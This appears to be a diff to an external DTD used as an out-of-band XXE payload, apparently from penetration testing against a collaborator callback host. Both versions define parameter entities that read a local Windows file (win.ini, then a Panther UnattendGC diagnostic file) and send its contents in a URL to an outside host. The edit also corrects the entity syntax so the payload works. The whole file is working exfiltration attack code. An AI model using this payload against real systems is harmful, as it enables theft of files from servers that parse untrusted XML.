@@ -1,3 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % eval "<!ENTITY %#x25; exfiltrate SYSTEM 'http://q6x94fyq0tgiplri38t83skziqoocd.cigitalcollaborator.com/?x=%file;'>">%eval;
+<!ENTITY % file SYSTEM "file:///C:/Windows/Panther/UnattendGC/diagwrn.xml">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://gk4vnih7y5k9kue92ut1mi7ncei86x.cigitalcollaborator.com/?x=%file;'>">
+%eval;
 %exfiltrate;
